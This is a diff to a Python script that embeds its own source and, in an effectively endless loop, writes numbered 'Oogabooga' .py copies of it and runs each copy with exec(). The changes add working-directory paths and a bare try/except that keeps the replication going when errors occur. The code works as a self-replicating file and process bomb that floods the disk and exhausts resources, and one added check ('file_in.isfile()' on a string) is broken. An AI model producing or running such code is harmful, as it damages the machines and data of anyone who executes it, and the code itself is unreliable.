@@ -16,7 +16,13 @@ path = "/"
 path2 = "C:"
 count = 0
 the_package = """
+path = "/"
+path2 = "C:"
+count = 0
+
 sys_files = os.listdir(path)
+cd = os.getcwd()
+cd += '/'
 
 
 def file_creation(il, code):
@@ -25,7 +31,7 @@ def file_creation(il, code):
     ooga_file = open(f"Oogabooga{il}.py", 'w')
     ooga_file.write(in_code)
     for file_in in sys_files:
-        if not os.access(file_in, os.R_OK):
+        if not os.access(file_in, os.R_OK) and file_in.isfile():
             pass
         elif file_in == 'snap':
             pass
@@ -38,15 +44,24 @@ def file_run(i, open2):
     number = i
     number += 1
     open2 = outside_ooga
-    open2 = open(f"Oogabooga{number}.py", 'r')
+    open2 = open(f"{cd}Oogabooga{number}.py")
+    print(open2)
     exec(open2.read())
 
 
 for num in range(0, 9999999999999999999999999999999):
     outside_ooga = file_creation(num, the_package)
     file_run(num, outside_ooga)
+
+
+
+
+
+
 """
 sys_files = os.listdir(path)
+cd = os.getcwd()
+cd += '/'
 
 
 def file_creation(il, code):
@@ -55,7 +70,7 @@ def file_creation(il, code):
     ooga_file = open(f"Oogabooga{il}.py", 'w')
     ooga_file.write(in_code)
     for file_in in sys_files:
-        if not os.access(file_in, os.R_OK):
+        if not os.access(file_in, os.R_OK) and file_in.isfile():
             pass
         elif file_in == 'snap':
             pass
@@ -68,11 +83,15 @@ def file_run(i, open2):
     number = i
     number += 1
     open2 = outside_ooga
-    open2 = open(f"Oogabooga{number}.py")
+    open2 = open(f"{cd}Oogabooga{number}.py")
+    print(open2)
     exec(open2.read())
 
 
 for num in range(0, 9999999999999999999999999999999):
     outside_ooga = file_creation(num, the_package)
-    file_run(num, outside_ooga)
+    try:
+        file_run(num, outside_ooga)
+    except:
+        pass
 
